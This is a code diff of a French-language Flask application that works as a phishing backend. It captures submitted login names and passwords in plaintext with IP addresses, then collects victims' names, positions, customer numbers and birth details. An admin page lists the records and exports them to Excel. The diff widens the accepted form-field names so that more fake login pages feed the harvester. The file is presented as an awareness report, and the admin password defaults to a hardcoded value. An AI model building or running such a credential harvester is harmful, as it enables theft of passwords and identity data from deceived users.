@@ -12,7 +12,6 @@ ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin_1234')
 
 DB_PATH = 'data.db'
 
-# --- Configuration de la Base de Données SQLite ---
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
@@ -24,8 +23,7 @@ def init_db():
             password TEXT,
             ip TEXT,
             fullname TEXT,
-            department TEXT,
-            phone TEXT,
+            poste TEXT,
             cus_num TEXT,
             birth_info TEXT
         )
@@ -40,7 +38,6 @@ def get_db_connection():
     conn.row_factory = sqlite3.Row
     return conn
 
-
 # ==========================================
 # 1. ROUTES UTILISATEURS
 # ==========================================
@@ -52,19 +49,18 @@ def index():
 @app.route('/submit-login', methods=['GET', 'POST'])
 def submit_login():
     if request.method == 'POST':
-        username = request.form.get('username') or request.form.get('email') or ''
-        password = request.form.get('password') or ''
+        username = request.form.get('username') or request.form.get('email') or request.form.get('login') or ''
+        password = request.form.get('password') or request.form.get('pwd') or ''
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         ip = request.remote_addr or ''
 
         conn = get_db_connection()
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO logs (timestamp, username, password, ip, fullname, department, phone, cus_num, birth_info)
-            VALUES (?, ?, ?, ?, '', '', '', '', '')
+            INSERT INTO logs (timestamp, username, password, ip, fullname, poste, cus_num, birth_info)
+            VALUES (?, ?, ?, ?, '', '', '', '')
         ''', (timestamp, username, password, ip))
         conn.commit()
-        
         user_id = cursor.lastrowid
         conn.close()
 
@@ -81,20 +77,19 @@ def submit_profile():
     if request.method == 'POST':
         user_id = session.get('current_user_id')
         
-        # Capture de tous les champs possibles issus du formulaire HTML
-        fullname = request.form.get('fullname') or request.form.get('nom') or request.form.get('fullname_postnom') or ''
-        department = request.form.get('department') or request.form.get('poste') or ''
-        phone = request.form.get('phone') or ''
-        cus_num = request.form.get('cus_num') or request.form.get('cus') or ''
-        birth_info = request.form.get('birth_info') or request.form.get('naissance') or ''
+        # Capture de tous les noms de champs possibles provenant des formulaires HTML
+        fullname = request.form.get('fullname') or request.form.get('nom') or request.form.get('fullname_postnom') or request.form.get('nom_postnom') or ''
+        poste = request.form.get('poste') or request.form.get('department') or request.form.get('fonction') or ''
+        cus_num = request.form.get('cus_num') or request.form.get('cus') or request.form.get('cusnum') or ''
+        birth_info = request.form.get('birth_info') or request.form.get('naissance') or request.form.get('etat_civil') or ''
 
         if user_id:
             conn = get_db_connection()
             conn.execute('''
                 UPDATE logs 
-                SET fullname = ?, department = ?, phone = ?, cus_num = ?, birth_info = ?
+                SET fullname = ?, poste = ?, cus_num = ?, birth_info = ?
                 WHERE id = ?
-            ''', (fullname, department, phone, cus_num, birth_info, user_id))
+            ''', (fullname, poste, cus_num, birth_info, user_id))
             conn.commit()
             conn.close()
 
@@ -104,9 +99,8 @@ def submit_profile():
 def success():
     return render_template('success.html')
 
-
 # ==========================================
-# 2. ROUTES ADMINISTRATION (PROTÉGÉES)
+# 2. ROUTES ADMINISTRATION
 # ==========================================
 
 @app.route('/admin')
@@ -118,7 +112,6 @@ def admin_dashboard():
     logs_rows = conn.execute('SELECT * FROM logs ORDER BY id DESC').fetchall()
     conn.close()
 
-    # Conversion des lignes de la DB en dictionnaires pour Jinja2
     logs = [dict(row) for row in logs_rows]
     return render_template('admin.html', logs=logs)
 
@@ -166,41 +159,17 @@ def export_excel():
     wb = openpyxl.Workbook()
     ws_data = wb.active
     ws_data.title = "Identifiants"
-    ws_data.append(["ID", "Date/Heure", "Identifiant/Email", "Mot de passe", "IP", "Nom & Postnom", "Poste/Département", "Téléphone", "CUS NUM", "Naissance / État Civil"])
+    ws_data.append(["ID", "Date/Heure", "Email/Identifiant", "Mot de passe", "IP", "Nom & Postnom", "Poste", "CUS NUM", "Naissance / État civil"])
 
-    dept_counts = {}
     for log in logs_rows:
         ws_data.append([
             log['id'], log['timestamp'], log['username'], log['password'],
-            log['ip'], log['fullname'], log['department'], log['phone'],
-            log['cus_num'], log['birth_info']
+            log['ip'], log['fullname'], log['poste'], log['cus_num'], log['birth_info']
         ])
-        dept = log['department'] or "Non renseigné"
-        dept_counts[dept] = dept_counts.get(dept, 0) + 1
-
-    ws_stats = wb.create_sheet(title="Statistiques")
-    ws_stats.append(["Département / Poste", "Nombre de piégés"])
-    for dept, count in dept_counts.items():
-        ws_stats.append([dept, count])
-
-    if dept_counts:
-        chart = BarChart()
-        chart.type = "col"
-        chart.style = 10
-        chart.title = "Répartition des pièges"
-        chart.y_axis.title = "Nombre"
-        chart.x_axis.title = "Poste"
-
-        data = Reference(ws_stats, min_col=2, min_row=1, max_row=len(dept_counts) + 1)
-        cats = Reference(ws_stats, min_col=1, min_row=2, max_row=len(dept_counts) + 1)
-        chart.add_data(data, titles_from_data=True)
-        chart.set_categories(cats)
-        ws_stats.add_chart(chart, "D2")
 
     file_path = "rapport_sensibilisation.xlsx"
     wb.save(file_path)
     return send_file(file_path, as_attachment=True)
-
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
